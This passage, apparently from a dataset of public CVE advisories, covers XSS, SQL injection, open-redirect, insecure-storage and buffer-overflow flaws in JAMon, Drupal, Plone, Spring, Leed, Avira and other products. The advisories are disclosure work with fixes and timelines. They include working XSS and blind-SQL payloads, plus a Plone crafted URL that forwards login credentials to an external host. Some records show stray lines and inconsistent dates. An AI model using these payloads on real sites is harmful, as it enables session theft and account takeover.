listenertype=1-->1<ScRiPt>alert('XSS')</ScRiPt><!--&currentlistener=JAMonBufferListener&outputTypeValue=html&formatterValue=%23%2C%23%23%23&bufferSize=No+Action&TextSize=&highlight=&ArraySQL=&actionSbmt=Go+%21
05.03) Malicious Request (""currentlistener "" parameter)
POST /jamon/mondetail.jsp HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0 Iceweasel/22.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost/jamon/mondetail.jsp
Cookie: JSESSIONID=3EFF8AFB46683B03B2CD73663A97FFDD.jboss1; ROUTEID=.jboss1
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 195
listenertype=value&currentlistener=1-->1<ScRiPt>alert('XSS')</ScRiPt><!--&outputTypeValue=html&formatterValue=%23%2C%23%23%23&bufferSize=No+Action&TextSize=&highlight=&ArraySQL=&actionSbmt=Go+%21
06. ### Business Impact ###
This may allow an attacker to create a specially crafted request that would execute arbitrary script code in a user's browser within the trust relationship between their browser and the server.
07. ### Systems Affected ###
This vulnerability was tested against: JAMon v2.7
Older versions are probably affected too, but they were not checked.
08. ### Vendor Information, Solutions and Workarounds ###
Currently, there are no known upgrades or patches to correct this vulnerability.
09. ### Credits ###
This vulnerability has been discovered by:
Christian Catalano aka wastasy ch(dot)catalano(at)gmail(dot)com
10. ### Vulnerability History ###
October 18th, 2013: Vulnerability identification
October 22th, 2013: Vendor notification [JAMon]
December 10th, 2013: Vulnerability confirmation [JAMonI]
January 23th, 2014: Vulnerability disclosure
11. ### Disclaimer ###
The information contained within this advisory is supplied ""as-is"" with
no warranties or guarantees of fitness of use or otherwise.
I accept no responsibility for any damage caused by the use or misuse of
this information.
###################################################"
7429,[CVE-2014-1607.] Cross Site Scripting(XSS) in Drupal Event calendar module,,CVE-2014-1607,"Advisory ID: hag2014101
Product: EventCalendar
Vendor: Drupal
Vulnerable Version(s): Drupal 7.14 and probably newer version
Tested Version: Drupal 7.14
Advisory Publication: January 23, 2014
Vendor Notification: November 20, 2013
Public Disclosure: January 23, 2014
Vulnerability Type: Cross-Site Scripting [CWE-79]
CVE Reference: CVE-2014-1607
Risk Level: Medium
CVSSv2 Base Score: 6.4 (AV:N/AC:H/Au:N/C:N/I:P/A:N)
Solution Status: Solution not yet released
Discovered and Provided: help AG Middle East
------------------------------------------------------------------------
-----------------------
about the vendor:
Drupal is an open source content management platform powering millions of websites and applications. It�s built, used, and supported by an active and diverse community of people around the world.
Advisory Details:
During a Pentest Help AG auditors(Ali & Khalilov) discovered the following:
Reflected cross-site scripting (XSS) vulnerability in Drupal 7.14 EventCalendar Module, found in eventcalendar/year allows remote attackers to inject arbitrary web scripts or HTML after the inproperly sanitizited Year Parameter
an adversary might use this vulnerability, an onmouseover payload was injected after the year which gets executed succssfully.
1) Cross-Site Scripting (XSS) in Mediatrix Web Management Interface: CVE-2014-1612
As proof of concept, one needs to access the following URL on a eventcalander/2013%22%20onmouseover%3dalert%28%27XSSed%27%29%20bad%3d%22 on the vulnerable website
Hackers could craft malicious URLs and send them and use them to steal cookies properly compromise the application.
------------------------------------------------------------------------
-----------------------
Solution:
The vendor was notified, contact the vendor for the patch details
------------------------------------------------------------------------
-----------------------
References:
[1] help AG middle East http://www.helpag.com/.
[2] Drupal https://drupal.org/
[3]
[4] Common Vulnerabilities and Exposures (CVE) - http://cve.mitre.org/ - international in scope and free for public use, CVE® is a dictionary of publicly known information security vulnerabilities and exposures.
[5] Common Weakness Enumeration (CWE) - http://cwe.mitre.org - targeted to developers and security practitioners, CWE is a formal list of software weakness types.
------------------------------------------------------------------------
-----------------------
Disclaimer: The information provided in this Advisory is provided ""as is"" and without any warranty of any kind. Details of this Advisory may be updated in order to provide as accurate information as possible."
7472,CVE-2013-4200 - Plone URL redirection / Forwarding of cookie data (session hijack) in certain browsers,,CVE-2013-4200,"#############################################################
#
# COMPASS SECURITY ADVISORY
# http://www.csnc.ch/en/downloads/advisories.html
#
#############################################################
#
# Product: Plone CMS
# Vendor: Plone Foundation (http://plone.org)
# ID(s): CSNC-2013-013, CVE-2013-4200
# Subject: URL Redirection Vulnerability
# Risk: High
# Effect: Remotely exploitable
# Author: Cyrill Bannwart <cyrill.bannwart csnc ch>
# Date: 20/05/2013
#
#############################################################
Introduction:
-------------
The discovered vulnerability targets the open source Plone CMS. The
credentials of a valid user can be obtained by using a specially
crafted URL which can be sent to the user by email. When clicking on
the URL, the user is presented with the website's login form and after
a successful login the user as well as his credentials are forwarded to
an external server. This vulnerability can be used by an attacker to
obtain access to a user's account.
Affected:
---------
Vulnerable:
* Plone < 4.3.1
Technical Description:
----------------------
An attacker can craft a URL for the login form where his victim has
valid credentials. The created URL contains a redirection URL to which
the user as well as his credentials are forwarded after a successful
login. This URL can be sent to the victim by mail.
By inserting a space before the redirection URL the isURLInPortal()
method of the URLTool class assumes the URL to be relative, not
filtering it against the allow_external_login_sites property.
Example of crafted URL:
https://example.com/acl_users/credentials_cookie_auth/require_login?next=+https%3A//www.csnc.ch
Once the victim clicks on the URL and logs in, a self-submitting POST
form is loaded that sends the user and his credentials to the external
server.
Example excerpt of HTTP Response:
HTTP/1.1 200 OK
Set-Cookie: __ac=""<CREDENTIALS>""; Path=/; HTTPOnly
[CUT]
<form method=""post"" id=""external_login_form"" name=""external_login_form"" action="" https://www.csnc.ch"">
<input type=""hidden"" name=""__ac"" value=""<CREDENTIALS>"" />
</form>
<script type=""text/javascript"">
/*jslint browser: true */
var external_login_form = document.forms.external_login_form;
external_login_form.style.display = 'none';
external_login_form.submit();
</script>
And resulting HTTP POST Request:
POST / HTTP/1.1
Host: www.csnc.ch
Referer: https://www.example.com/login_form
[CUT]
__ac=<CREDENTIALS>
The obtained credentials / cookie content can be used by the attacker to
login to the website and gain access to the victim's account.
The login form allows further URL parameters such as the password reset
link or the sign up URL that can also be tricked into accepting
non-relative URLs.
Workaround / Fix / Patch:
-------------------------
Patch has been released by vendor
Timeline:
---------
2013-05-08: Vulnerability discovered
2013-05-20: Vendor notified
2013-05-21: Vendor acknowledged
2013-06-18: Patch released
2013-07-02: Patch updated
2014-01-16: Disclosure
References:
-----------
https://plone.org/products/plone/security/advisories/20130618-announcement
https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2013-4200"
7480,CVE-2013-6430 Possible XSS when using Spring MVC,,CVE-2013-6430,"Severity: Low
Vendor: Spring by Pivotal
Versions Affected:
- Spring MVC 3.0.0 to 3.2.1
- Earlier unsupported versions may be affected
Description:
The JavaScriptUtils.javaScriptEscape() method did not escape all characters that
are sensitive within either a JS single quoted string, JS double quoted string,
or HTML script data context. In most cases this will result in an unexploitable
parse error but in some cases it could result in an XSS vulnerability.
Mitigation:
Users of affected versions should apply the following mitigation:
- Users of 3.x should upgrade to 3.2.2 or later
Credit:
This issue was originally reported to the Spring Framework developers by Jon
Passki and the security implications brough to the attention of the Pivotal
security team by Arun Neelicattu.
References:
http://www.gopivotal.com/security/cve-2013-6430
https://jira.springsource.org/browse/SPR-9983
https://github.com/spring-projects/spring-framework/commit/7a7df6637478607bef0277bf52a4e0a03e20a248
History:
2014-Jan-14: Initial vulnerability report published."
7481,CVE-2013-6429 Fix for XML External Entity (XXE) injection (CVE-2013-4152) in Spring Framework was incomplete,,CVE-2013-6429,"Severity: Important
Vendor: Spring by Pivotal
Versions Affected:
- Spring MVC 3.0.0 to 3.2.4
- Spring MVC 4.0.0.M1-4.0.0.RC1
- Earlier unsupported versions may be affected
Description:
Spring MVC's SourceHttpMessageConverter also processed user provided XML and
neither disabled XML external entities nor provided an option to disable them.
SourceHttpMessageConverter has been modified to provide an option to control the
processing of XML external entities and that processing is now disabled by
default.
Mitigation:
Users of affected versions should apply the following mitigation:
- Users of 3.x should upgrade to 3.2.5 or later
- Users of 4.x should upgrade to 4.0.0 or later
(This is also fixed in 4.0.0-RC2 but users are recommended to use 4.0.0 or later)
Credit:
This issue was identified by the Spring development team.
References:
http://www.gopivotal.com/security/cve-2013-6429
https://jira.springsource.org/browse/SPR-11078
https://github.com/spring-projects/spring-framework/commit/2ae6a6a3415eebc57babcb9d3e5505887eda6d8a
http://www.gopivotal.com/security/cve-2013-4152
History:
2014-Jan-14: Initial vulnerability report published."
7482,[CVE-2014-1238] Cross Site Scripting(XSS) in q-pulse application,,CVE-2014-1238,"Cross-Site Scripting (XSS) in Q-Pulse application
Advisory ID: hag201475
Product: q-pulse risk management software
Vendor: q-pulse
Vulnerable Version(s): 0.6 and probably prior
Tested Version: 0.6
Advisory Publication: Januray 14, 2013
Vendor Notification: July 31, 2013
Public Disclosure: December 31, 2013
Vulnerability Type: Cross-Site Scripting [CWE-79]
CVE Reference: CVE-2014-1238
Risk Level: Low
CVSSv2 Base Score: 2.6 (AV:N/AC:H/Au:N/C:N/I:P/A:N)
Solution Status: Solution not yet released
Discovered and Provided: help AG Middle East
------------------------------------------------------------------------
-----------------------
about the vendor:
Q-Pulse is the proven quality, safety and risk management solution for thousands of organisations across the world.
Advisory Details:
during a PenTest help ag discovered a cross site scripting in one of Q-pulse applications, which can be exploited to perform Cross-Site Scripting (XSS) attacks.
1) Cross-Site Scripting (XSS) in q-pulse application: CVE-2014-1238
When URL encoded GET input ""LookupListType"" was set to ""DocumentTypeLookupList�%0A%0Aalert(123)"" on the page ""/qpulse5web/ui/common/managedlistdialog.aspx/"". the parameter with directly inserted to a javascript
variable named $RootTree without validation, an attacker A remote attacker can trick a logged-in administrator to open a specially crafted link and execute arbitrary HTML and script code in browser in context of the vulnerable website.
The exploitation example using the following :
http://[host]/qpulse5web/ui/common/managedlistdialog.aspx/LookupListType=DocumentTypeLookupList�%0A%0Aalert(123);//
------------------------------------------------------------------------
-----------------------
Solution:
the vendor was notified, contact the vendor for the patch details
------------------------------------------------------------------------
-----------------------
References:
[1] help AG middle East http://www.helpag.com/.
[2] q-pulse application http://www.q-pulse.com/ Q-Pulse is the proven quality, safety and risk management solution for thousands of organisations across the world.
[3] Common Vulnerabilities and Exposures (CVE) - http://cve.mitre.org/ - international in scope and free for public use, CVE® is a dictionary of publicly known information security vulnerabilities and exposures.
[4] Common Weakness Enumeration (CWE) - http://cwe.mitre.org - targeted to developers and security practitioners, CWE is a formal list of software weakness types.
------------------------------------------------------------------------
-----------------------
Disclaimer: The information provided in this Advisory is provided ""as is"" and without any warranty of any kind. Details of this Advisory may be updated in order to provide as accurate information as possible."
7487,[CVE-2014-0647] Insecure Data Storage of User Data Elements in Starbucks v2.6.1 iOS mobile application,,CVE-2014-0647,"Title: [CVE-2014-0647] Insecure Data Storage of User Data Elements in Starbucks v2.6.1 iOS mobile application
Published: January 13, 2014
Reported to Vendor: December 2013 (no direct response)
CVE Reference: CVE-2014-0647
Credit: This issue was discovered by Daniel E. Wood
http://www.linkedin.com/in/danielewood
Product: Starbucks iOS mobile application
Version: 2.6.1 (May 02, 2013)
Vendor: Starbucks Coffee Company
URL: https://itunes.apple.com/us/app/starbucks/id331177714
Issue: Username, email address, and password elements are being stored in clear-text in the session.clslog crashlytics log file.
Location: /Library/Caches/com.crashlytics.data/com.starbucks.mystarbucks/session.clslog
Within session.clslog there are multiple instances of the storage of clear-text credentials that can be recovered and leveraged for unauthorized usage of a users account on the malicious users’ own device or online at https://www.starbucks.com/account/signin. It contains the HTML of the mobile application page that performs the account login or account reset. session.clslog also contains the OAuth token (signed with HMAC-SHA1) and OAuth signature for the users account/device to the Starbucks service.
From session.clslog:
<div class=""block_login"">
<form action=""/OAuth/sign-in"" class=""siren"" id=""accountForm"" method=""post"">
<fieldset class=""login_position"">
<legend><span class=""group-header"">I have a Starbucks account.</span></legend>

[...snip...]

<li>
<label for=""Account_UserName"" class="""">Username <span class='req'>*</span></label>
<span class=""x"">
<input class=""field text medium"" id=""Account_UserName"" maxlength=""200"" name=""Account.UserName"" tabindex=""0"" type=""text"" value=""CLEARTEXT"" />
</span>
</li>
<li>
<label for=""Account_PassWord"" class="""">Password <span class='req'>*</span></label>
<span class=""x"">
<input class=""field text medium"" id=""Account_PassWord"" maxlength=""200"" name=""Account.PassWord"" tabindex=""0"" type=""password"" value=""CLEARTEXT"" />
</span>
</li>
43440 $ -[AccountManager forgotPasswordEmail:withUserName:] line 1609 $ BODY STRING:[ {""emailAddress"":""CLEARTEXT"",""userName"":""CLEARTEXT""} ]
Note: All references of 'CLEARTEXT' above are the cleartext values of each referenced string.
Mitigation:
To prevent sensitive user data (credentials) from being recovered by a malicious user, output sanitization should be conducted to prevent these data elements from being stored in the crashlytics log files in clear-text, if at all.

iOS Specific Best Practices (from OWASP Mobile Top 10 - M1 Insecure Data Storage):
- Never store credentials on the phone file system. Force the user to authenticate using a standard web or API login scheme (over HTTPS) to the application upon each opening and ensure session timeouts are set at the bare minimum to meet the user experience requirements.
- Where storage or caching of information is necessary consider using a standard iOS encryption library such as CommonCrypto
- If the data is small, using the provided apple keychain API is recommended but, once a phone is jailbroken or exploited the keychain can be easily read. This is in addition to the threat of a bruteforce on the devices PIN, which as stated above is trivial in some cases.
- For databases consider using SQLcipher for Sqlite data encryption
- For items stored in the keychain leverage the most secure API designation, kSecAttrAccessibleWhenUnlocked (now the default in iOS 5) and for enterprise managed mobile devices ensure a strong PIN is forced, alphanumeric, larger than 4 characters.
- For larger or more general types of consumer-grade data, Apple’s File Protection mechanism can safely be used (see NSData Class Reference for protection options).
- Avoid using NSUserDefaults to store senstitve pieces of information as it stores data in plist files.
- Be aware that all data/entities using NSManagedObects will be stored in an unencrypted database file.
References:
http://try.crashlytics.com/security/
https://developer.apple.com/library/mac/documentation/Security/Conceptual/SecureCodingGuide/SecurityDevelopmentChecklists/SecurityDevelopmentChecklists.html#//apple_ref/doc/uid/TP40002415-CH1-SW1
https://www.owasp.org/index.php/IOS_Developer_Cheat_Sheet#Insecure_Data_Storage_.28M1.29"
7509,[CVE-2013-6480] Libcloud doesn't send scrub_data query parameter when destroying a DigitalOcean node,,CVE-2013-6480,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
[CVE-2013-6480] Libcloud doesn't send scrub_data query parameter when
destroying a DigitalOcean node
Severity: Low
Vendor: Apache Software Foundation
Project: Apache Libcloud (http://libcloud.apache.org/)
Affected Versions: Apache Libcloud 0.12.3 to 0.13.3 (version prior to
0.12.3 don't include a DigitalOcean driver)
Description:
DigitalOcean recently changed the default API behavior from scrub to
non-scrub when destroying a VM.
Libcloud doesn't explicitly send ""scrub_data"" query parameter when
destroying a node. This means nodes which are destroyed using Libcloud
are vulnerable to later customers stealing data contained on them.
Note: Only users who are using DigitalOcean driver are affected by this issue.
References:
- - http://libcloud.apache.org/security.html
- - https://digitalocean.com/blog_posts/transparency-regarding-data-security
- - https://github.com/fog/fog/issues/2525
Mitigation:
This vulnerability has been fixed in version 0.13.3. Users who use
DigitalOcean driver are strongly encouraged to upgrade to this
release.
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.11 (GNU/Linux)
iQJ8BAEBCgBmBQJSxEgAXxSAAAAAAC4AKGlzc3Vlci1mcHJAbm90YXRpb25zLm9w
ZW5wZ3AuZmlmdGhob3JzZW1hbi5uZXQ5OTc4MjhEQzYyRjc1OUNFQTE4OUQ2NUUy
QzA3NTRCMkNFMDY5MkYzAAoJECwHVLLOBpLzbRcQAJqSobMiGfjpBQCGhda8zW62
6aPEjyuStv9FZ0/eLN6bxPCV8LdxOYy6M1oehr3ntT56Dd/lZ9+gwJunTH3UqWmq
ZqiwmME8JLhNTLC8tab+yE82lQlck2iXgTaJ5pZfXELFPiTEZ+DAQN26CpkA8bLO
cXAlMJkskPS6BkkgLDtLfO9RHe8T0QsEcHxQSwCpursiIlQEfjG3tQqG21KEvSm6
Q31qv87cZrG2pQPXEQ7Ir59E7Yos/7vEnG57wY/Xj94wKeKpHxnBUUL37BW+/tb1
qP29zZUol628HxowsGCN7xJPlXrcc4wc37rWja/UTcBWZGUk4EKTX9xXVs1jKuPB
lJqlGkEHglRcFI1AJLv9VkPBj77z6aEFu89bbJn8aZwAmPwnIBLZiJGp0LvqlVap
RYgV8SdLb1D4GxTDJJN76PLghMJdo1mEUwLbinr8JGH/MXzTkTUwgMCv7ks8ww7Q
hZp40rKDY+Su7VML6ONcnnvZTlAxCJM2lexD0svV8e3oXf/8lUzlnHCHQH8/TIrV
6DV4mj7Yg+HiR9Tj8+AMAAmC5l88Byl/+sJjAEdWBTKjzwiey5ocDX5s/aL12o+9
JX7vnFOWaGWf0pMeGuCl2gqtG+jFoEkr7BU7d0k7TvVFTQ0jTrrhVv9rbdIiJbK4
HXvdPzy/CBQt0tUGc6UT
=8Jgs
-----END PGP SIGNATURE-----"
7555,"[CVE-2013-2627, CVE-2013-2628, CVE-2013-2629] Leed (Light Feed) - Multiple vulnerabilities",,CVE-2013-2627,"#############################################################
#
# COMPASS SECURITY ADVISORY
# http://www.csnc.ch/en/downloads/advisories.html
#
#############################################################
#
# Product: Leed (Light Feed)
# Vendor: Valentin CARRUESCO aka Idleman
# CSNC ID: CSNC-2013-005 (SQL Injection), CSNC-2013-006 (CSRF), CSNC-2013-007 (Authentication Bypass)
# CVD ID: CVE-2013-2627 (SQL Injection), CVE-2013-2628 (CSRF), CVE-2013-2629 (Authentication Bypass)
# Subject: Multiple vulnerabilities (see above)
# Risk: High
# Effect: Remotely exploitable
# Author: Alexandre Herzog <alexandre.herzog csnc ch>
# Date: 18.12.2013
#
#############################################################
Introduction:
-------------
Leed is a lightweight RSS/ATOM aggregator based on PHP. It can be hosted
on any server supporting PHP and aims to be an alternative to Google
Reader and its substitutes. [1]
Technical Description
---------------------
1. SQL injection (CSNC-2013-005 / CVE-2013-2627)
The SQL injection is within the ID parameter of
leed/action.php?action=removeFolder&id=-1 as user input does not get
properly escaped. Escaping is otherwise done consistently across the
remaining of the audited code. Exploiting this issue is tricky due to
the HTML encoding, but not impossible, e.g.
If select @@version returns '5.0.84-log' on your database,
CAST(@@version as signed) will return 5
Injection parameter (before encoding) would e.g. be
IF(CAST(@@version as signed) in(5),BENCHMARK(2000000,SHA1(0)),-1)
This blind SQL will last ~5 seconds on my installation as the condition
is true. This way, you could extract information one by one from the
mysql tables.
2. Authorization bypasses in action.php (CSNC-2013-007 / CVE-2013-2629)
The following actions can be called anonymously, as the $myUser variable
isn't verified:
- importForm
- importFeed
- addFavorite
- removeFavorite
3. Missing anti cross-site request forgery token (CSNC-2013-006 / CVE-2013-2628)
None of the actions done within action.php requires a token to defeat CSRF.
This means malicious action can be executed under the identity of a logged
in Leed admin if the victim clicks on a malicious link or visits a website
under the attacker's control.
Workaround / Fix:
-----------------
Upgrade to the latest available version of Leed.
Timeline:
---------
2013-12-18: Public disclosure date
2013-03-19: GIT commit of the fixes
2013-03-19: Initial vendor response
2013-03-19: Discovery by Alexandre Herzog & initial vendor notification
References:
-----------
[1] http://projet.idleman.fr/leed/
--
Alexandre Herzog, IT Security Analyst, Compass Security AG
Werkstrasse 20, 8645 Jona, Switzerland
Schauplatzgasse 39, 3011 Bern, Switzerland
Tel: +41 55 214 41 66
http://www.csnc.ch/"
7556,[CVE-2013-2764] Secure Entry Server - URL Redirection,,CVE-2013-2764,"#############################################################
#
# COMPASS SECURITY ADVISORY
# http://www.csnc.ch/en/downloads/advisories.html
#
#############################################################
#
# Product: Secure Entry Server (SES)
# Vendor: United Security Providers Ltd.
# CSNC ID: CSNC-2013-008
# CVD ID: CVE-2013-2764
# Subject: URL Redirection
# Risk: High
# Effect: Remotely exploitable
# Author: Alexandre Herzog <alexandre.herzog csnc ch>
# Date: 18.12.2013
#
#############################################################
Introduction:
-------------
The USP Secure Entry Server™ protects company networks and business
transactions with internet access as a Web application firewall (WAF)
and manages access to data and applications.
The USP Secure Entry Server™ (SES) offers this protection by scanning
data packages right down to the individual items of content, thus
reliably safeguarding Web applications and all transactions carried out
using them. The SES acts as an x-ray scanner for online transactions; it
identifies data packages infected by viruses and only approves undamaged
or cleaned data packages for use.[1]
Technical Description
---------------------
By default, the USP Secure Entry Server is shipped with option
HSP_AbsoluteRedirects set to off. The consequence is that after a
successful cookie-check, the server replies with a relative instead of
an absolute link. The server doesn't detect that relative URLs starting
with double slash are in fact detected as a valid domain by browsers and
not just a path on the actual server.
1. Initial request
GET //www.hacking-lab.com HTTP/1.1
Host: [victim]
User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:19.0) Gecko/20100101 Firefox/19.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
2. Server redirect to the cookie check procedure
HTTP/1.1 302 Found
Date: Wed, 03 Apr 2013 09:23:56 GMT
Server: server
Location: /cookie-check?trg=[long token]
Set-Cookie: SCDID_S=[session id] path=/; Secure; HttpOnly
Content-Length: 290
Content-Type: text/html; charset=iso-8859-1
Keep-Alive: timeout=65, max=100
Connection: Keep-Alive
<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN"">
<html><head>
<title>302 Found</title>
</head><body>
<h1>Found</h1>
<p>The document has moved <a href=""/cookie-check?trg=[long token]"">here</a>.</p>
</body></html>
3. As instructed, the browser accesses the cookie check page, proving it
support cookies:
GET /cookie-check?trg=[long token] HTTP/1.1
Host: [victim]
User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:19.0) Gecko/20100101 Firefox/19.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: SCDID_S=[session id]
Connection: keep-alive
4. SES gets the expected request, and redirects the client to the
initially requested page, but without stripping the double-slashes and
without forcing a fully qualified domain name for the redirection:
HTTP/1.1 302 Found
Date: Wed, 03 Apr 2013 09:23:56 GMT
Server: server
Location: //www.hacking-lab.com
Content-Length: 205
Content-Type: text/html; charset=iso-8859-1
Keep-Alive: timeout=65, max=100
Connection: Keep-Alive
<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN"">
<html><head>
<title>302 Found</title>
</head><body>
<h1>Found</h1>
<p>The document has moved <a href=""//www.hacking-lab.com"">here</a>.</p>
</body></html>
5. The browser doesn't interpret a redirection to //www.hacking-lab.com
as being http(s)://[victim]//www.hacking-lab.com, but in fact as a
redirection to http(s)://www.hacking-lab.com. This behavior is RFC
conform and is well implemented in most current browsers[2]. The client
gets therefore redirected to another website by the SES.
Workaround / Fix:
-----------------
Upgrade to the latest available version of SES or ensure option
HSP_AbsoluteRedirects is set to on (as it's by default in the appliance
but not the software version), as this would insert the FQDN in the
response of the server.
Timeline:
---------
2013-12-18: Coordinated public disclosure date (after 3 months grace period)
2013-09-18: Release of fixed SES Appliance Version 4.7.0 and HSP Software Version 4.5.0
2013-04-26: Initial vendor response
2013-04-23: Initial formal vendor notification based on advisory and CVE-ID
2013-04-07: Assigned CVE-2013-2764
2013-04-03: Discovery of the same issue but with a different customer
2012-09-10: Discussed with a representative of the vendor, which did not consider it as a major issue but customer related
2012-09-06: Discovery by Alexandre Herzog
References:
-----------
[1] http://www.united-security-providers.com/en/it-security-solutions/protection-for-web-applications/
[2] http://stackoverflow.com/questions/6785442/browser-support-for-urls-beginning-with-double-slash"
7615,[CVE-2013-6986] Insecure Data Storage in Subway Ordering for California (ZippyYum) 3.4 iOS mobile application,,CVE-2013-6986,"Title: [CVE-2013-6986] Insecure Data Storage in Subway Ordering for California (ZippyYum) 3.4 iOS mobile application
Published: December 7, 2013
Reported to Vendor: May 2013
CVE Reference: CVE-2013-6986
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-6986
CVSS v2 Base Score: 4.9
CVSS v2 Vector (AV:L/AC:L/Au:N/C:C/I:N/A:N/E:H/RL:U/RC:C)
Credit: This issue was discovered by Daniel E. Wood
http://www.linkedin.com/in/danielewood
Originally posted here: http://seclists.org/fulldisclosure/2013/Dec/39
Vendor: ZippyYum, LLC | http://www.zippyyum.com
Application: https://itunes.apple.com/us/app/subwayoc/id510770549?mt=8
Tested Version: 3.4
File: SubwayOCKiosk.app
App Name: Subway CA Kiosk
Build Time-stamp: 2012-06-07_09-20-17
1. Introduction: Subway CA is a mobile application available both on iOS and Android based devices that allows customers to build and order food menu items that can be paid for through the application using a payment card such as a debit or credit card.
2. Vulnerability Description: The application stores sensitive data insecurely to cache files located within ../Caches/com.ZippyYum.SubwayOC/ directory on the device.
Loading Cache.db and/or Cache.db-wal in a tool that can read sqlite databases (such as RazorSQL) will allow a malicious user to read unencrypted sensitive data stored in clear-text.
Sensitive data elements found within Cache.db and Cache.db-wal:
- password and encryptionKey for the application/user account
- customerPassword
- customerEmail
- deliveryStreet
- deliveryState
- deliveryZip
- paymentMethod
- paymentCardType
- paymentCardNumber
- paymentSecurityCode
- paymentExpMonth
- paymentExpYear
- paymentBillingCode
- customerPhone
- longitude (of device)
- latitude (of device)
- email
3. Vulnerability History:
May 9, 2013: Vulnerability identification
May 15, 2013: Unofficial vendor notification
August 4, 2013: Official vendor notification via report
September 20, 2013: Vulnerability remediation notification*
December 7, 2013: Vulnerability disclosure
*Current Version: 3.7.1 (Tested: only customerName, customerEmail, customerPhone, location, paymentCardType are in clear-text within Subway.sqlite-wal)"
7672,CVE-2013-6795 Vulnerability in the Rackspace Windows Agent and Updater,,CVE-2013-6795,"A vulnerability in the Rackspace Windows Agent and Updater was discovered that allows for modified Agent binaries to be remotely uploaded (without authentication) to Rackspace Cloud Server guest instances. Modified Agent binaries are processed as an update for the Agent and arbitrary code can then be executed after the service is restarted. CloudPassage disclosed the vulnerability to Rackspace and CVE-2013-6795 was issued by MITRE Corporation.
The Windows Agent and Updater is used by Windows Cloud Server instances on OpenStack Nova to handle boot configurations for Windows guests running on the Xen hypervisor. The agent was created by Rackspace for their Windows instances and both the Agent and Updater services run under the LocalSystem account.
Previous versions of the Updater (before 1.2.6.0) allowed for unsigned agent updates utilizing a specially crafted .NET remote call to TCP port 1984. The Update service takes a single .NET serializable object with a URL and an MD5 checksum. Once the sequence is triggered, a ZIP file is downloaded, verified using the checksum, and extracted into the program folder of the Agent service before the service is restarted. No authentication is performed by the .NET remoting service, making it possible to deploy a modified Agent update that overwrites the running Agent service binary. A proof of concept tool was developed to trigger the sequence with an arbitrary download URL using the original .NET libraries from a target.
Full details here: http://blog.cloudpassage.com/2013/11/18/cve-2013-6795-vulnerability-rackspace-windows-agent-updater/
CloudPassage responsibly disclosed the finding to Rackspace and, as of version 1.2.6.0, the Updater has been changed to use IPC with XenStore and no longer listens on port 1984. Rackspace recommends that users running the Windows agent less than version 1.2.6.1 update to the latest version, available on GitHub at https://github.com/rackerlabs/openstack-guest-agents-windows-xenserver."
7719,[CVE-2013-6356] Avira Secure Backup v1.0.0.1 Multiple Registry Key Value Parsing Local Buffer Overflow Vulnerability,,CVE-2013-6356,"RCE Security Advisory
http://www.rcesecurity.com
1. ADVISORY INFORMATION
-----------------------
Product: Avira Secure Backup
Vendor URL: www.avira.com
Type: Improper Restriction of Operations within the Bounds of
a Memory Buffer [CWE-119]
Date found: 2013-10-30
Date published: 2013-11-16
CVSSv2 Score: 4,4 (AV:L/AC:M/Au:N/C:P/I:P/A:P)
CVE: CVE-2013-6356
2. CREDITS
----------
This vulnerability was discovered and researched by Julien Ahrens from
RCE Security.
3. VERSIONS AFFECTED
--------------------
Avira Secure Backup v1.0.0.1 Build 3616
4. VULNERABILITY DESCRIPTION
----------------------------
A buffer overflow vulnerability has been identified in Avira Secure
Backup v1.0.0.1 Build 3616.
The application loads the values of the Registry Keys
""AutoUpdateDownloadFilename"" and ""AutoUpdateProgressFilename"" from
""HKEY_CURRENT_USERSoftwareAvira Secure Backup"" on startup but does not
properly validate the length of the fetched values before using them in
the further application context, which leads to a buffer overflow
condition with possible persistent code execution.
The application queries the values via a RegQueryValueExW call and a
fixed buffer pointer (lpData) and a fixed buffer size pointer
(lpcbData). If the input string size is greater than the predefined
size, the application uses a second RegQueryValueExW call with the new
buffer size set to the length of the input string, but reuses the
original buffer pointer (lpData), which has not been resized. This
results in overwriting memory space inlcuding SEH - records.
An attacker needs to force the victim to import an arbitrary .reg file
in order to exploit the vulnerability. Successful exploits can allow
attackers to execute arbitrary code with the privileges of the user
running the application. Failed exploits will result in a
denial-of-service condition. The attack scenario is persistent, because
the code is executed as long as the manipulated values are loaded into
the Registry.
5. DEBUG INFORMATION
--------------------
Call stack of main thread
Address Returns to Procedure / arguments Called
from
0012EB48 77DA6F87 <JMP.&ntdll.memmove> ADVAPI32.77DA6F82
0012EB4C 0012ECBC dest = 0012ECBC
0012EB50 0015760C src = 0015760C
0012EB54 00002712 n = 2712 (10002.)
0012EC28 77DA708B ADVAPI32.77DA6E02 ADVAPI32.77DA7086
0012EC60 0043F15D Includes ADVAPI32.77DA708B Avira_Se.0043F15B
0012EC9C 0043F3F8 Avira_Se.0043F0D2 Avira_Se.0043F3F3
0012F5B4 00CC00CC *** CORRUPT ENTRY ***
The vulnerable code part of Avira Secure Backup.exe:
0043F0D2 PUSH EBP
0043F0D3 MOV EBP,ESP
0043F0D5 SUB ESP,10
0043F0D8 PUSH EBX
0043F0D9 PUSH ESI
0043F0DA MOV ESI,DWORD PTR DS:[<&ADVAPI32.RegOpen>;
ADVAPI32.RegOpenKeyExW
0043F0E0 PUSH EDI
0043F0E1 LEA EAX,DWORD PTR SS:[EBP-8]
0043F0E4 PUSH EAX ; /pHandle
0043F0E5 PUSH 20019 ; |Access
0043F0EA XOR EBX,EBX ; |
0043F0EC PUSH EBX ; |Reserved => 0
